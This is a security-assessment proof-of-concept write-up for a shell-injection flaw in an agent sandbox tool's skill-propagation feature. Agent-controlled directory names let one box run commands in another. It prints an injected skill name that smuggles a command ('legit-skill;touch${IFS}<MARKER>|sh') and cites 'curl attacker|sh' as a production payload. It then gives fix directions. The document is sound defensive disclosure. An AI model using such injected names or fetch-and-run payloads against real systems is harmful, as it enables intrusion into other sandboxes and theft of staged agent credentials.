# PoC — Cross-box RCE via shell injection in settings propagation

**Severity: High** · Threat-model item #4 (one box reading/controlling another) · Cloud
providers (e2b/vercel/daytona) via `CloudSyncTransport`; docker config-volume twin in
`settings-propagate.ts` · Requires the victim to run `download claude <src> --propagate` — a
normal skill-sync workflow.

## The bug

`agentbox download claude <src> --propagate all|project` copies skills/agents/commands from a
**source** box into every **other** running box. The item names are directory basenames from
the source box's `~/.claude` — **agent-controlled** (a valid Linux dir name may contain
`;` `$` `{` `}` `|` `` ` `` — only `/` and NUL are excluded). They are filtered only for
host-presence / an `agentbox-` prefix (`claude-pull.ts` `pickNewItems`), never for shell
metacharacters, and then reach the target box through an **unquoted** shell string:

```ts
// packages/sandbox-core/src/sync/agent-propagate.ts:146,170-173
const abs = (rel) => `${boxDir}/${rel}`;
async copyIn(stagingAbs, rel, kind) {          // rel = `skills/<attacker-name>`
  if (kind === 'dir') {
    await t.exec(['sh','-c', `mkdir -p '${abs(rel)}'`]);   // exec() -> quoteShellArgv (safe-ish)
    await t.pushTree(stagingAbs, abs(rel), …);             // -> applyTarball(localTar, abs(rel))
  }
}

// packages/sandbox-cloud/src/sync/sync-transport.ts:62-65  (applyTarball) -- THE SINK
await backend.exec(handle,
  `tar -xf ${remoteTar} -C ${boxDestDir} --no-same-permissions --no-same-owner -m && rm -f ${remoteTar}`);
```

`applyTarball` (and `pushFile`'s `chown`/`chmod`, and `pullTree`) build **raw command
strings** and hand them to `backend.exec`, bypassing the `quoteShellArgv` that the argv-taking
`exec()` uses. For a cloud backend, `backend.exec(handle, cmd)` runs `cmd` in a **shell inside
the target box** (e2b `sb.commands.run`, vercel runtime, …). `boxDestDir` embeds the attacker
name, so `;`/`$()`/`|` in the name run commands in the victim box.

## What the PoC proves

`poc.mjs` drives the **real** `createCloudSyncTransport` (`packages/sandbox-cloud/dist`) with a
mock `CloudBackend` whose `exec` is the target box's shell, and passes the exact `boxDestDir`
the propagate wrapper computes for an attacker skill name:

```
propagate computes boxDestDir = /home/vscode/.claude/skills/legit-skill;touch${IFS}<MARKER>|sh
command applyTarball ran in the target box:
  tar -xf /tmp/agentbox-apply-0.tar -C /home/vscode/.claude/skills/legit-skill;touch${IFS}<MARKER>|sh --no-same-permissions ...
VULNERABLE -- a box-controlled name executed a command inside a DIFFERENT box.
  marker created in the target box context
```

The `;` ends `tar`; `touch <MARKER>` (via `${IFS}` for the space, so the name survives the
inventory parse) runs in the target box. In production the payload is e.g. `curl attacker|sh`,
running as the target box user (passwordless sudo) — full access to that box's workspace and
staged agent credentials.

## Running it

```bash
pnpm install && pnpm --filter @agentbox/sandbox-cloud... build
node security-assessment/pocs/cross-box-propagate-injection/poc.mjs
```

The PoC exercises the shipped `applyTarball` sink; the mock backend only stands in for the
per-provider `backend.exec`/`uploadFile` (which run a shell string in the box).

## Fix directions

- Route `applyTarball`, `pushFile` (`chown`/`chmod`), `pullTree`, and `readText` through
  `quoteShellArgv` / an argv array — never raw string interpolation into `backend.exec`.
- Validate propagated item names against a strict allow-list (`[A-Za-z0-9._-]+`, reject any
  name with shell metacharacters or path separators) in `pickNewItems` before they become a
  `rel`.
- Apply the same fix to the docker twin `settings-propagate.ts` (single-quoted but still
  `'`-injectable) running its helper container as `--user 0`.
